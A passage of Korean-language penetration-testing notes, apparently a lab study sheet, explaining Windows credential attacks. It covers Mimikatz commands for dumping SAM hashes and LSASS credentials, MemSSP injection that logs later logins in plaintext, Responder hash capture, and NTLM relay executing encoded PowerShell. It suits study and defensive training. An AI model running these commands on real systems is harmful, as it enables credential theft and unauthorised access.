...
privilege::debug
```
- `privilege::debug` 명령은 디버그 권한을 활성화
- 이 권한이 있어야 LSASS 프로세스에 접근하여 자격 증명을 덤프할 수 있음

```bash
token::elevate
```
- 토큰을 SYSTEM 권한으로 상승시켜, 보안 제한 없이 시스템 자원에 접근

```bash
lsadump::sam
```
- SAM(Security Account Manager) 데이터베이스에서 사용자 계정의 해시를 추출
- 출력된 해시는 `USERNAME:RID:LM_HASH:NTLM_HASH:::` 형식
...
```
- `-v` : 이전에 캡처링 된 해시 다시 캡처링 하도록 도와줌
- Responder는 NTLM 인증 요청을 가로채서 해시를 수집하는 도구
- `-I tap0` : 사용할 네트워크 인터페이스 지정 (예: `eth0`, `wlan0`, `tap0`)
- Responder는 SMB, HTTP, FTP 등 프로토콜을 이용한 인증 요청에 응답해, 클라이언트가 보낸 Net-NTLMv2 해시를 캡처
...
- `-c "powershell -enc ..."` : 인증 성공 시 실행할 명령 (Base64 인코딩된 PowerShell 명령)

**동작 원리:**
- 공격자는 Net-NTLMv2 인증 요청을 가로채서, 이를 SMB 서비스가 열려 있는 다른 타겟으로 전달
- 타겟이 해당 인증을 신뢰하면, 명령 실행 권한을 얻게 됨
...
Get-ComputerInfo
```
- 현재 시스템의 OS 버전, 빌드 번호, 보안 설정 등을 확인
- Credential Guard가 활성화되어 있는지 파악하는 데 도움
...
privilege::debug
```
- SeDebugPrivilege를 활성화하여 LSASS 등의 민감한 프로세스에 접근
- 관리자 권한 필요
...
```
- 현재 로그인된 세션의 사용자 이름, 도메인, 해시, 평문 비밀번호 등을 덤프
- **주의**: Credential Guard 활성화 시 평문 비밀번호 추출이 제한될 수 있음

### Impacket을 이용한 원격 명령 실행
```bash
...
### MemSSP(메모리 보안 지원 공급자) 주입
```bash
misc::memssp
```
- Mimikatz의 `memssp` 모듈은 LSASS에 SSP(Security Support Provider)를 주입하여 이후 로그인 자격 증명을 `mimilsa.log` 파일에 기록하게 함
- 새로운 로그인 시도가 발생하면 해당 자격 증명이 평문으로 로깅됨

### 캡처된 자격 증명 확인
```bash
type C:\Windows\System32\mimilsa.log
```
- MemSSP로 캡처된 평문 자격 증명을 확인
